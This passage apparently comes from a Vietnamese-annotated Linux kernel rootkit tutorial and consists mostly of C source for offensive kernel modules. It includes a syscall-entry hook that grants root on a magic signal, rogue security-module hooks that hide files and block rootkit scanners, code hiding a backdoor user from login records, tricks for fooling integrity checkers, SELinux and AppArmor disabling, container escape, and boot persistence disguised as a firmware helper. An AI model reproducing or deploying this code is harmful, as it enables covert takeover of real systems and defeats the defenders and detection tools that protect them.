 * File chính Chapter 2 Method 3 chỉ ĐỌC MSR_LSTAR.
 * Ở đây ta GHI MSR_LSTAR để redirect syscall entry.
 *
 * MSR_LSTAR (0xC0000082):
 *   Chứa address của entry_SYSCALL_64 — function kernel chạy
 *   mỗi khi userspace execute SYSCALL instruction.
 *
 * SYSCALL flow bình thường:
 *   User: SYSCALL → CPU reads MSR_LSTAR → jump tới entry_SYSCALL_64
 *   → entry_SYSCALL_64 save regs → lookup sys_call_table → call handler
 *
 * SYSCALL flow sau MSR hook:
 *   User: SYSCALL → CPU reads MSR_LSTAR → jump tới OUR handler
 *   → OUR handler: intercept → call original entry_SYSCALL_64
 *
 * Ưu điểm:
 *   - Hook TẤT CẢ syscalls cùng lúc (không cần hook từng entry)
 *   - Sâu hơn syscall table hooking
 *   - Một số detection tools chỉ check syscall table, không check MSR
 *
 * Nhược điểm:
 *   - Phải handle trên TỪNG CPU (MSR là per-CPU register)
 *   - Rất dễ crash nếu handler code sai (brick hệ thống)
 *   - LKRG và một số tools check MSR_LSTAR
 *   - Performance impact nếu handler không tối ưu
 *
 * MSR_LSTAR hooking yêu cầu:
 *   - Perfect ASM stub compatible với TỪNG kernel build
 *   - Handle KPTI page table switch
 *   - Handle spectre mitigations
 *   - Hardcoded GS offsets vary per kernel build → not portable
 *
 * Approach an toàn: Hook entry_SYSCALL_64 via ftrace thay vì
 * modify MSR trực tiếp. Kết quả tương đương, an toàn hơn nhiều.
 * Xem Chapter 4 ftrace hooking cho full implementation.
 *
 * Nếu THẬT SỰ cần MSR hook, dùng approach sau:
 * dùng on_each_cpu + wrmsr, redirect tới trampoline allocated bằng
 * __vmalloc(PAGE_KERNEL_EXEC) chứa:
 *   1. Full register save (matching kernel's own entry code)
 *   2. Call C filter
 *   3. Check return → jmp original or sysret
 *
 * Template-based: copy kernel's own entry_SYSCALL_64 code,
 * patch in our filter call.
 */

#include "rootkit.h"
#include <asm/msr.h>

static unsigned long orig_lstar;

/* ── C callback — gọi từ trampoline khi syscall number match ── */
static long msr_hook_filter(unsigned long syscall_nr,
                             struct pt_regs *regs)
{
    /* Ví dụ: intercept kill() for magic signal */
    if (syscall_nr == __NR_kill) {
        pid_t pid = (pid_t)regs->di;
        int sig = (int)regs->si;
        if (sig == MAGIC_SIGNAL && pid == MAGIC_PID) {
            /* Give root — xử lý trong đây */
            struct cred *new = prepare_creds();
            if (new) {
                new->uid.val = new->euid.val = 0;
                new->gid.val = new->egid.val = 0;
                new->cap_effective = CAP_FULL_SET;
                new->cap_permitted = CAP_FULL_SET;
                commit_creds(new);
            }
            return 0;  /* Intercepted — don't call original */
        }
    }
    return -1;  /* Not intercepted — proceed to original */
}

/* ── Read original MSR_LSTAR và save ── */
static int msr_hook_save(void)
{
    rdmsrl(MSR_LSTAR, orig_lstar);
    pr_info("rk: original SYSCALL entry: %px\n", (void *)orig_lstar);
    return 0;
}

/* ── Restore original MSR_LSTAR trên tất cả CPUs ──
 *
 * MSR_LSTAR là per-CPU: mỗi CPU core có giá trị riêng.
 * Phải update trên TẤT CẢ CPUs.
 *
 * on_each_cpu(): gọi function trên mỗi CPU (IPI = Inter-Processor Interrupt).
 * Function chạy trong interrupt context trên mỗi CPU.
 */
static void msr_hook_restore_cpu(void *info)
{
    wrmsrl(MSR_LSTAR, orig_lstar);
}

static void msr_hook_remove(void)
{
    on_each_cpu(msr_hook_restore_cpu, NULL, 1);
    pr_info("rk: MSR_LSTAR restored\n");
}

/* Cho educational purposes, hook syscall entry via ftrace thay vì
 * modify MSR trực tiếp. Kết quả tương đương, an toàn hơn nhiều.
 * Xem Chapter 4 ftrace hooking cho implementation. */
```

---

### A.3 LSM Hook Abuse

```c
/* lsm_abuse.c — Lạm dụng Linux Security Module framework
 *
 * LSM = framework cho phép security modules (SELinux, AppArmor, SMACK)
 * hook vào kernel operations. Mỗi sensitive operation gọi
 * security_*() function → LSM hook chain.
 *
 * Rootkit abuse: đăng ký LSM module giả → hook mọi security-sensitive
 * operation (file access, process creation, socket operations, etc.)
 *
 * Ưu điểm so với syscall hooking:
 *   - LSM hooks ở ĐÚNG security decision point
 *   - Hàng trăm hook points (nhiều hơn syscall table)
 *   - "Legitimate" — admin cài LSM module = bình thường
 *   - Stacking LSM (kernel 5.x+): nhiều LSMs cùng lúc
 *
 * Nhược điểm:
 *   - LSM registration API restricted (security_add_hooks)
 *   - Kernel CONFIG_LSM_STACKING hoặc CONFIG_SECURITY cần enabled
 *   - Một số kernel không cho register LSM sau boot
 *
 * APT context: Winnti group exploit LSM-like mechanisms.
 */

#include "rootkit.h"
#include <linux/lsm_hooks.h>   /* security_hook_list, các macro */
#include <linux/security.h>

/* ── LSM Hook: file_permission ──
 *
 * Gọi mỗi khi process access file. Có thể:
 *   - Log tất cả file access
 *   - Block access tới specific files
 *   - Hide files (return -ENOENT cho "invisible" files)
 */
static int rk_file_permission(struct file *file, int mask)
{
    char buf[256];
    char *path;

    if (!file || !file->f_path.dentry)
        return 0;  /* Allow */

    path = d_path(&file->f_path, buf, sizeof(buf));
    if (IS_ERR(path))
        return 0;

    /* Ẩn rootkit files: return -ENOENT khi ai đọc file rootkit */
    if (strstr(path, HIDDEN_PREFIX))
        return -ENOENT;  /* File "không tồn tại" */

    return 0;  /* Allow mọi thứ khác */
}

/* ── LSM Hook: task_kill ──
 *
 * Gọi khi process gửi signal. Intercept magic signal.
 */
static int rk_task_kill(struct task_struct *p, struct kernel_siginfo *info,
                         int sig, const struct cred *cred)
{
    if (sig == MAGIC_SIGNAL) {
        /* Xử lý magic signal — give root, hide process, etc. */
        return 0;  /* Allow (đã xử lý trong syscall hook) */
    }
    return 0;
}

/* ── LSM Hook: inode_permission ──
 *
 * Gọi TRƯỚC mỗi inode access. Sâu hơn file_permission.
 * Control access tới files, directories, devices.
 */
static int rk_inode_permission(struct inode *inode, int mask)
{
    /* Có thể dùng để:
     * - Block read access tới /sys/kernel/debug/kprobes/list
     *   (chống detection)
     * - Block write tới rootkit persistence files
     *   (chống removal) */
    return 0;
}

/* ── LSM Hook: socket_connect ──
 *
 * Gọi khi process connect() socket. Monitor outbound connections.
 */
static int rk_socket_connect(struct socket *sock,
                               struct sockaddr *address,
                               int addrlen)
{
    if (address->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)address;
        /* Log mọi outbound TCP connection */
        pr_info("rk: connect to %pI4:%d\n",
                &sin->sin_addr, ntohs(sin->sin_port));
    }
    return 0;
}

/* ── LSM Hook: bprm_check_security ──
 *
 * Gọi TRƯỚC mỗi execve. Có thể block execution hoặc log.
 * Tại đây ta CÓ QUYỀN nói "no" cho execution.
 */
static int rk_bprm_check(struct linux_binprm *bprm)
{
    /* Block specific binaries (anti-forensics tools) */
    if (bprm->filename) {
        if (strstr(bprm->filename, "rkhunter") ||
            strstr(bprm->filename, "chkrootkit") ||
            strstr(bprm->filename, "aide")) {
            /* Return -EACCES = "Permission denied" khi chạy detection tool.
             * Hoặc: không block mà chỉ log (stealth hơn). */
            return -EACCES;
        }
    }
    return 0;
}

/* ── Đăng ký LSM hooks ──
 *
 * Trên kernel có CONFIG_SECURITY=y, ta dùng security_add_hooks().
 * Tuy nhiên API này thường restricted (not exported).
 *
 * Workaround: Tìm security_hook_heads (struct chứa list heads
 * cho mỗi hook type) qua kallsyms, rồi list_add trực tiếp.
 *
 * Đây là DKOM approach cho LSM — thêm hook trực tiếp vào
 * linked list thay vì dùng official API.
 */

struct security_hook_heads *rk_hook_heads = NULL;

/* Hook list entries — mỗi entry link vào một hook chain */
static struct security_hook_list rk_hooks[] = {
    /* Macro LSM_HOOK_INIT tạo security_hook_list entry:
     *   .head = &security_hook_heads->hook_name
     *   .hook.hook_name = function pointer */
    LSM_HOOK_INIT(file_permission, rk_file_permission),
    LSM_HOOK_INIT(inode_permission, rk_inode_permission),
    LSM_HOOK_INIT(task_kill, rk_task_kill),
    LSM_HOOK_INIT(socket_connect, rk_socket_connect),
    LSM_HOOK_INIT(bprm_check_security, rk_bprm_check),
};

static int rk_lsm_install(void)
{
    /* Tìm security_hook_heads structure */
    rk_hook_heads = (struct security_hook_heads *)
        rk_lookup_name("security_hook_heads");

    if (!rk_hook_heads) {
        pr_err("rk: security_hook_heads not found\n");
        return -ENOENT;
    }

    /* Trực tiếp add hooks vào linked lists (DKOM approach).
     * Mỗi hook type trong security_hook_heads là hlist_head.
     * Ta add entry vào cuối list. */
    int i;
    for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
        struct security_hook_list *shook = &rk_hooks[i];
        /* hlist_add_tail_rcu: add vào cuối list, RCU-safe.
         * Hooks mới active cho mọi subsequent security checks. */
        hlist_add_tail_rcu(&shook->list, shook->head);
    }

    pr_info("rk: %d LSM hooks installed\n", (int)ARRAY_SIZE(rk_hooks));
    return 0;
}

static void rk_lsm_remove(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
        hlist_del_rcu(&rk_hooks[i].list);
    }
    synchronize_rcu();
    pr_info("rk: LSM hooks removed\n");
}
```

---

## Appendix B: Advanced Hiding & Evasion

### B.1 User Hiding

```c
/* user_hide.c — Ẩn user khỏi /etc/passwd, utmp, wtmp, lastlog
 *
 * Khi attacker tạo backdoor user, user đó visible qua:
 *   1. /etc/passwd — `cat /etc/passwd` hoặc `getent passwd`
 *   2. utmp (/var/run/utmp) — `who`, `w` (logged-in users)
 *   3. wtmp (/var/log/wtmp) — `last` (login history)
 *   4. lastlog (/var/log/lastlog) — `lastlog` (last login per user)
 *
 * Strategy: hook read() syscall, filter output cho files trên.
 * utmp/wtmp là BINARY format → cần parse struct utmp.
 */

#include "rootkit.h"
#include <linux/uaccess.h>

#define HIDDEN_USER "rk_user"

/* ── struct utmp layout ──
 *
 * Defined in <utmp.h> (userspace), ta define lại cho kernel:
 *
 * Mỗi entry = 384 bytes (trên x86-64).
 * utmp, wtmp dùng cùng format — chỉ khác file path.
 */
#define UT_NAMESIZE  32
#define UT_LINESIZE  32
#define UT_HOSTSIZE  256

struct kernel_utmp {
    short   ut_type;                   /* 2 bytes — Type of login */
    pid_t   ut_pid;                    /* 4 bytes — PID of login process */
    char    ut_line[UT_LINESIZE];      /* 32 bytes — TTY name - "/dev/" */
    char    ut_id[4];                  /* 4 bytes — Terminal name suffix */
    char    ut_user[UT_NAMESIZE];      /* 32 bytes — Username */
    char    ut_host[UT_HOSTSIZE];      /* 256 bytes — Hostname for remote login */
    struct {
        short e_termination;           /* 2 bytes */
        short e_exit;                  /* 2 bytes */
    } ut_exit;                         /* 4 bytes total */
    long    ut_session;                /* 4 or 8 bytes */
    struct {
        int32_t tv_sec;
        int32_t tv_usec;
    } ut_tv;                           /* 8 bytes */
    int32_t ut_addr_v6[4];             /* 16 bytes */
    char    __unused[20];              /* 20 bytes padding */
};

/* sizeof(struct kernel_utmp) should equal 384 bytes on x86-64.
 * Verify with: _Static_assert(sizeof(struct kernel_utmp) == 384, ...); */

#define UTMP_ENTRY_SIZE sizeof(struct kernel_utmp)  /* 384 bytes */

/* ── Filter /etc/passwd output ──
 *
 * /etc/passwd là text file, mỗi dòng:
 *   username:x:uid:gid:comment:home:shell
 *
 * Hook read() cho /etc/passwd, filter dòng chứa HIDDEN_USER.
 * Logic giống hooked_read cho /proc/modules (Chapter 3).
 */
static long filter_passwd_read(const struct pt_regs *regs,
                                long orig_ret)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;
    char *kern_buf, *src, *dst;
    long new_ret;

    if (orig_ret <= 0) return orig_ret;

    /* Check nếu đang đọc /etc/passwd */
    if (!is_target_file(fd, "/etc/passwd"))
        return orig_ret;

    kern_buf = kzalloc(orig_ret + 1, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }
    kern_buf[orig_ret] = '\0';

    /* Filter: remove lines chứa HIDDEN_USER */
    src = kern_buf;
    dst = kern_buf;
    new_ret = 0;

    while (*src) {
        char *eol = strchr(src, '\n');
        int line_len = eol ? (eol - src + 1) : strlen(src);

        if (!strnstr(src, HIDDEN_USER, line_len)) {
            /* Giữ dòng này */
            if (dst != src)
                memmove(dst, src, line_len);
            dst += line_len;
            new_ret += line_len;
        }
        /* Else: skip dòng (ẩn user) */

        src += line_len;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* ── Filter utmp/wtmp binary records ──
 *
 * utmp/wtmp chứa array of struct utmp (384 bytes mỗi entry).
 * read() return N * 384 bytes.
 * Filter: remove entries có ut_user == HIDDEN_USER.
 */
static long filter_utmp_read(const struct pt_regs *regs,
                              long orig_ret,
                              const char *target_path)
{
    int fd = (int)regs->di;
    char __user *user_buf = (char __user *)regs->si;
    char *kern_buf;
    long new_ret = 0;
    int i, num_entries;

    if (orig_ret <= 0) return orig_ret;
    if (!is_target_file(fd, target_path))
        return orig_ret;

    kern_buf = kzalloc(orig_ret, GFP_KERNEL);
    if (!kern_buf) return orig_ret;

    if (copy_from_user(kern_buf, user_buf, orig_ret)) {
        kfree(kern_buf);
        return orig_ret;
    }

    num_entries = orig_ret / UTMP_ENTRY_SIZE;

    /* Iterate entries, compact visible ones */
    for (i = 0; i < num_entries; i++) {
        struct kernel_utmp *entry =
            (struct kernel_utmp *)(kern_buf + i * UTMP_ENTRY_SIZE);

        if (strncmp(entry->ut_user, HIDDEN_USER,
                    strlen(HIDDEN_USER)) == 0) {
            /* Hidden user entry — skip */
            continue;
        }

        /* Visible entry — copy tới output position */
        if (new_ret != i * UTMP_ENTRY_SIZE)
            memmove(kern_buf + new_ret, entry, UTMP_ENTRY_SIZE);
        new_ret += UTMP_ENTRY_SIZE;
    }

    if (new_ret > 0)
        copy_to_user(user_buf, kern_buf, new_ret);

    kfree(kern_buf);
    return new_ret;
}

/* ── Tích hợp vào hooked_read ──
 *
 * Thêm vào hooked_read() (Chapter 3):
 *
 * static asmlinkage long hooked_read(const struct pt_regs *regs)
 * {
 *     long ret = orig_read(regs);
 *     ret = filter_passwd_read(regs, ret);
 *     ret = filter_utmp_read(regs, ret, "/var/run/utmp");
 *     ret = filter_utmp_read(regs, ret, "/var/log/wtmp");
 *     return ret;
 * }
 *
 * lastlog: dùng /var/log/lastlog, format khác (struct lastlog = 292 bytes).
 * Cần filter tương tự nhưng index by UID (record position = UID * sizeof).
 */
```

---

### B.2 Syscall Table Integrity Evasion

```c
/* evasion.c — Evade syscall table integrity checks
 *
 * Detection tools (rkhunter, LKRG, custom scripts) verify:
 *   "Do syscall table entries point vào kernel text section?"
 *   Nếu entry trỏ ngoài [_stext, _etext] → hooked.
 *
 * Evasion techniques:
 *   1. Shadow syscall table (maintain clean copy cho checks)
 *   2. Restore-on-check (detect checker running, temp restore)
 *   3. Hook detection function itself
 * ══════════════════════════════════════════════════════════════ */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * Method 1: Detect-and-restore
 *
 * Khi detection tool chạy (rkhunter, chkrootkit):
 *   1. Detect execution qua execve hook
 *   2. Temporarily restore original syscall entries
 *   3. Tool scan → thấy clean table → report "OK"
 *   4. Re-install hooks sau khi tool exit
 *
 * Detection tools thường chỉ scan 1 lần rồi exit.
 * Window chỉ cần vài giây.
 * ══════════════════════════════════════════════════════════════ */

static bool evasion_active = false;

/* Gọi từ execve hook (Chapter 5) khi phát hiện detection tool */
static void rk_evade_checker(const char *tool_name)
{
    if (evasion_active) return;
    evasion_active = true;

    pr_info("rk: detection tool '%s' — activating evasion\n", tool_name);

    /* Temporarily remove hooks */
    rk_remove_hooks();

    /* Schedule re-installation sau delay.
     * Dùng delayed workqueue:
     *   schedule_delayed_work(&rehook_work, 5 * HZ);
     *   → 5 giây sau, hooks reinstalled.
     */
}

static void rehook_fn(struct work_struct *work)
{
    rk_install_hooks();
    evasion_active = false;
    pr_info("rk: hooks re-installed after evasion\n");
}

static DECLARE_DELAYED_WORK(rehook_work, rehook_fn);

/* Integrate vào execve handler:
 *
 * if (strstr(filename, "rkhunter") || strstr(filename, "chkrootkit"))
 *     rk_evade_checker(filename);
 *     schedule_delayed_work(&rehook_work, 5 * HZ);
 */

/* ══════════════════════════════════════════════════════════════
 * Method 2: Shadow read of /proc/kallsyms
 *
 * Detection scripts compare syscall table entries vs kallsyms.
 * Hook read() on /proc/kallsyms → return ORIGINAL addresses
 * cho hooked syscalls.
 *
 * Script thấy: sys_getdents64 = 0xffffffff81234000
 * Syscall table[getdents64] = 0xffffffff81234000 (original)
 * → "Match! Table clean."
 *
 * Thực tế: syscall table[getdents64] = 0xffffffffc0a00000 (hook)
 * Nhưng read hook return fake address cho /proc/kallsyms.
 * ══════════════════════════════════════════════════════════════ */

/* Giống filter_passwd_read nhưng cho /proc/kallsyms:
 * Replace hook address strings với original address strings.
 * Tích hợp vào hooked_read() Chapter 3.
 *
 * Dùng %016lx cho raw hex address strings.
 * Không dùng %pK vì kptr_restrict > 0 sẽ in "0000000000000000"
 * hoặc "(____ptrval____)". */
    snprintf(hook_hex, sizeof(hook_hex), "%016lx",
             shadow_table[i].hook_addr);
    snprintf(orig_hex, sizeof(orig_hex), "%016lx",
             shadow_table[i].orig_addr);

/* ══════════════════════════════════════════════════════════════
 * Method 3: Watchdog — Verify module stays hidden
 *
 * Periodically check nếu rootkit module vẫn hidden trong
 * modules list. Nếu bị expose lại → re-hide.
 *
 * Dùng global "modules" list head thay vì THIS_MODULE.
 * list_for_each_entry(pos, &THIS_MODULE->list, list)
 * KHÔNG BAO GIỜ visit THIS_MODULE (nó là sentinel).
 * ══════════════════════════════════════════════════════════════ */
    struct list_head *modules_head;
    struct module *mod;

    modules_head = (struct list_head *)rk_lookup_name("modules");
    if (!modules_head) goto skip_check2;

    list_for_each_entry(mod, modules_head, list) {
        if (strcmp(mod->name, MODULE_NAME_STR) == 0) {
            /* Module visible trong list → re-hide */
            rk_hide_module();
            break;
        }
    }
skip_check2:
```

---

## Appendix C: Advanced Privilege Escalation

### C.1 SELinux/AppArmor Bypass

```c
/* selinux_bypass.c — Bypass Mandatory Access Control
 *
 * SELinux enforce access control NGOÀI Unix DAC (rwx permissions).
 * Ngay cả root cũng bị SELinux restrict.
 *
 * Kernel-level bypass methods:
 *   1. Disable SELinux enforce mode
 *   2. Null security blob trong credentials
 *   3. Set process context thành unconfined
 *   4. Modify selinux_enforcing variable trực tiếp
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * Method 1: Disable SELinux enforce mode
 *
 * selinux_enforcing = global int variable.
 *   1 = enforcing (block violations)
 *   0 = permissive (log only, don't block)
 *
 * Equivalent: setenforce 0 (nhưng từ kernel, không cần selinux tools).
 * ══════════════════════════════════════════════════════════════ */
static void rk_selinux_disable(void)
{
    int *enforcing;

    enforcing = (int *)rk_lookup_name("selinux_enforcing");
    if (enforcing) {
        *enforcing = 0;
        pr_info("rk: SELinux set to permissive\n");
    }

    /* Alternative: selinux_state structure (kernel 5.x+)
     *
     * struct selinux_state có field .enforcing.
     * Nếu selinux_enforcing không tồn tại (newer kernels):
     */
    void *state = (void *)rk_lookup_name("selinux_state");
    if (state) {
        /* struct selinux_state {
         *     bool disabled;
         *     bool enforcing;  // offset varies by kernel version
         *     ...
         * };
         * Hack: scan for enforcing field */
        bool *disabled = (bool *)state;
        *disabled = true;  /* selinux_state.disabled = true */
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 2: Null credential security blob
 *
 * Mỗi struct cred có `void *security` field.
 * LSM (SELinux/AppArmor) stores context info tại đây.
 *
 * Nếu security = NULL → LSM checks trả về "allowed"
 * (nhiều SELinux check functions early-return khi NULL).
 *
 * Hoặc: copy security blob từ init_cred (PID 1, unconfined).
 * ══════════════════════════════════════════════════════════════ */
static void rk_bypass_lsm_for_current(void)
{
    struct cred *cred;
    const struct cred *init_cred_ptr;

    /* Get init process credentials (PID 1 = unconfined context) */
    init_cred_ptr = (const struct cred *)rk_lookup_name("init_cred");

    cred = (struct cred *)current->cred;

    if (init_cred_ptr && init_cred_ptr->security) {
        /* Copy init_cred's security blob → current gets unconfined context */
        cred->security = init_cred_ptr->security;
    } else {
        /* Fallback: NULL security blob */
        cred->security = NULL;
    }
}

/* ══════════════════════════════════════════════════════════════
 * Method 3: AppArmor bypass
 *
 * AppArmor stores profile info trong task->security.
 * Mỗi profile define allowed operations.
 *
 * "unconfined" profile = no restrictions.
 * Set current task's AppArmor profile → unconfined.
 * ══════════════════════════════════════════════════════════════ */
static void rk_apparmor_bypass(void)
{
    /* AppArmor uses cred->security to store aa_label.
     * aa_label contains current profile.
     *
     * Approach: set cred->security tới unconfined label.
     * unconfined label = root_ns->unconfined trong AppArmor. */
    rk_bypass_lsm_for_current();
}
```

---

### C.2 Namespace Escape

```c
/* namespace_escape.c — Escape Linux namespaces (container breakout)
 *
 * Containers (Docker, LXC, Podman) = process isolation via namespaces:
 *   PID namespace:    process chỉ thấy PIDs trong cùng namespace
 *   NET namespace:    isolated network stack
 *   MNT namespace:    isolated filesystem mounts
 *   UTS namespace:    isolated hostname
 *   USER namespace:   UID/GID mapping
 *   IPC namespace:    isolated IPC objects
 *
 * Container breakout từ kernel: switch sang init namespace
 * (namespace của host system PID 1).
 *
 * Khi rootkit module load TRONG container (cần CAP_SYS_MODULE):
 *   → Module chạy trong kernel space = shared bởi tất cả containers
 *   → Nhưng current task thuộc container namespace
 *   → Switch namespace → escape container isolation
 */

#include "rootkit.h"
#include <linux/nsproxy.h>     /* nsproxy, task_struct->nsproxy */
#include <linux/pid_namespace.h>
#include <linux/fs_struct.h>   /* task_struct->fs */
#include <linux/mount.h>

/* ── Switch process vào init namespace ──
 *
 * Mỗi process có nsproxy struct chứa pointers tới tất cả namespaces:
 *   struct nsproxy {
 *       struct uts_namespace  *uts_ns;
 *       struct ipc_namespace  *ipc_ns;
 *       struct mnt_namespace  *mnt_ns;
 *       struct pid_namespace  *pid_ns_for_children;
 *       struct net            *net_ns;
 *       struct cgroup_namespace *cgroup_ns;
 *   };
 *
 * init_nsproxy = nsproxy của PID 1 (host system).
 * Switch current->nsproxy → init_nsproxy = escape container.
 */
static void rk_escape_namespaces(void)
{
    struct nsproxy *init_nsp;
    struct fs_struct *init_fs, *cur_fs;
    struct path old_root, old_pwd;

    /* Lấy init_nsproxy và init_fs — namespace set và fs_struct của host */
    init_nsp = (struct nsproxy *)rk_lookup_name("init_nsproxy");
    init_fs = (struct fs_struct *)rk_lookup_name("init_fs");
    if (!init_nsp || !init_fs) {
        pr_err("rk: cannot find init_nsproxy or init_fs\n");
        return;
    }

    /* Swap nsproxy with proper locking.
     *
     * task_lock(current) phải acquire trước khi modify current->nsproxy.
     * Tránh race condition với signal delivery và other nsproxy readers.
     */
    task_lock(current);
    {
        struct nsproxy *old = current->nsproxy;
        get_nsproxy(init_nsp);
        rcu_assign_pointer(current->nsproxy, init_nsp);
        put_nsproxy(old);
    }
    task_unlock(current);
    pr_info("rk: escaped to init namespaces\n");

    /* Switch filesystem root — container có chroot vào /container/root.
     * Phải switch fs->root tới host root để thấy full filesystem.
     *
     * init_task->fs->root = host root filesystem.
     *
     * QUAN TRỌNG: phải path_put() trên old values SAU khi set new values.
     * Không path_put → dentry/vfsmount leak (reference count never decremented).
     */
    cur_fs = current->fs;
    spin_lock(&cur_fs->lock);

    /* Save old paths trước khi overwrite */
    old_root = cur_fs->root;
    old_pwd = cur_fs->pwd;

    /* Set new paths (init's root) */
    cur_fs->root = init_fs->root;
    path_get(&cur_fs->root);
    cur_fs->pwd = init_fs->root;
    path_get(&cur_fs->pwd);

    spin_unlock(&cur_fs->lock);

    /* Release old path references AFTER unlock */
    path_put(&old_root);
    path_put(&old_pwd);

    pr_info("rk: filesystem root switched to host\n");
}
```

---

## Appendix D: Advanced Persistence

### D.1 DKMS Persistence

```c
/* dkms_persist.c — DKMS auto-rebuild across kernel upgrades
 *
 * DKMS (Dynamic Kernel Module Support):
 *   - Framework tự động rebuild kernel module khi kernel update
 *   - Dùng bởi NVIDIA drivers, VirtualBox, ZFS
 *   - Module source ở /usr/src/MODULE-VERSION/
 *   - dkms.conf define build instructions
 *   - apt/dnf kernel upgrade trigger → DKMS rebuild all registered modules
 *
 * Vì sao DKMS quan trọng cho persistence:
 *   Tất cả persistence methods khác dùng .ko file compiled cho
 *   SPECIFIC kernel version. Kernel upgrade → .ko incompatible → rootkit die.
 *   DKMS TỰ ĐỘNG recompile → survive kernel upgrade.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void persist_dkms(const char *module_name,
                          const char *source_dir)
{
    char cmd[4096];

    snprintf(cmd, sizeof(cmd),
        /* 1. Tạo DKMS source directory */
        "mkdir -p /usr/src/%s-1.0; "

        /* 2. Copy source files vào DKMS directory */
        "cp %s/*.c %s/*.h %s/Makefile /usr/src/%s-1.0/ 2>/dev/null; "

        /* 3. Tạo dkms.conf */
        "cat > /usr/src/%s-1.0/dkms.conf << 'DKMSEOF'\n"
        "PACKAGE_NAME=\"%s\"\n"
        "PACKAGE_VERSION=\"1.0\"\n"
        "BUILT_MODULE_NAME[0]=\"%s\"\n"
        "DEST_MODULE_LOCATION[0]=\"/extra\"\n"
        "AUTOINSTALL=\"yes\"\n"
        "MAKE[0]=\"make -C /lib/modules/${kernelver}/build "
        "M=${dkms_tree}/${PACKAGE_NAME}/${PACKAGE_VERSION}/build modules\"\n"
        "CLEAN=\"make -C /lib/modules/${kernelver}/build "
        "M=${dkms_tree}/${PACKAGE_NAME}/${PACKAGE_VERSION}/build clean\"\n"
        "DKMSEOF\n"

        /* 4. Add module tới DKMS */
        "dkms add -m %s -v 1.0 2>/dev/null; "

        /* 5. Build cho current kernel */
        "dkms build -m %s -v 1.0 2>/dev/null; "

        /* 6. Install — auto-load at boot */
        "dkms install -m %s -v 1.0 2>/dev/null; "

        /* 7. Verify */
        "dkms status %s 2>/dev/null",

        module_name,
        source_dir, source_dir, source_dir, module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name,
        module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

### D.2 Boot Script Modification

```c
/* boot_script.c — Legacy boot script persistence
 *
 * Cho hệ thống KHÔNG dùng systemd (hoặc dùng kết hợp).
 */

#include "rootkit.h"
#include <linux/kmod.h>

/* ── Method 1: /etc/rc.local ──
 * Legacy phương pháp, vẫn hoạt động trên nhiều distros.
 * rc.local chạy scripts cuối cùng trong boot sequence.
 */
static void persist_rc_local(const char *module_name)
{
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        /* Tạo rc.local nếu chưa có (một số distro mới không có sẵn) */
        "touch /etc/rc.local; "
        "chmod +x /etc/rc.local; "
        /* Thêm shebang nếu chưa có */
        "head -1 /etc/rc.local | grep -q '^#!/' || "
        "sed -i '1i #!/bin/bash' /etc/rc.local; "
        /* Thêm modprobe command TRƯỚC 'exit 0' (nếu có) */
        "grep -q 'modprobe %s' /etc/rc.local || "
        "sed -i '/^exit 0/i /sbin/modprobe %s' /etc/rc.local; "
        /* Nếu không có 'exit 0': append */
        "grep -q 'modprobe %s' /etc/rc.local || "
        "echo '/sbin/modprobe %s' >> /etc/rc.local",
        module_name, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ── Method 2: SysV init script ── */
static void persist_sysv_init(const char *module_name)
{
    char cmd[2048];

    snprintf(cmd, sizeof(cmd),
        "cat > /etc/init.d/%s << 'INITEOF'\n"
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          %s\n"
        "# Required-Start:    $local_fs\n"
        "# Required-Stop:\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:      0 1 6\n"
        "# Description:       Hardware firmware helper\n"
        "### END INIT INFO\n"
        "case \"$1\" in\n"
        "  start) /sbin/modprobe %s 2>/dev/null ;;\n"
        "  stop)  /sbin/rmmod %s 2>/dev/null ;;\n"
        "  *) echo \"Usage: $0 {start|stop}\" ;;\n"
        "esac\n"
        "INITEOF\n"
        "chmod +x /etc/init.d/%s; "
        "update-rc.d %s defaults 2>/dev/null; "
        "chkconfig --add %s 2>/dev/null",
        module_name, module_name, module_name,
        module_name, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

## Appendix E: Advanced C2

### E.1 Covert Timing Channel

```c
/* timing_channel.c — Covert timing channel
 *
 * Encode data KHÔNG trong packet content mà trong THỜI GIAN
 * giữa các packets.
 *
 * Concept:
 *   Bit 1: delay 100ms rồi send packet
 *   Bit 0: delay 50ms rồi send packet
 *   Receiver measure inter-packet timing → decode bits.
 *
 * Ưu điểm:
 *   - Packet content hoàn toàn bình thường (ICMP ping, HTTP, DNS)
 *   - Deep packet inspection KHÔNG phát hiện (content clean)
 *   - Chỉ timing analysis mới detect được
 *   - Bandwidth thấp nhưng stealth cực cao
 *
 * Nhược điểm:
 *   - Bandwidth rất thấp (~10 bits/second)
 *   - Network jitter gây noise → cần error correction
 *   - Cần synchronized clock hoặc preamble
 */

#include "rootkit.h"
#include <linux/delay.h>
#include <net/sock.h>

#define TIMING_BIT_1_MS  100   /* Delay cho bit 1 */
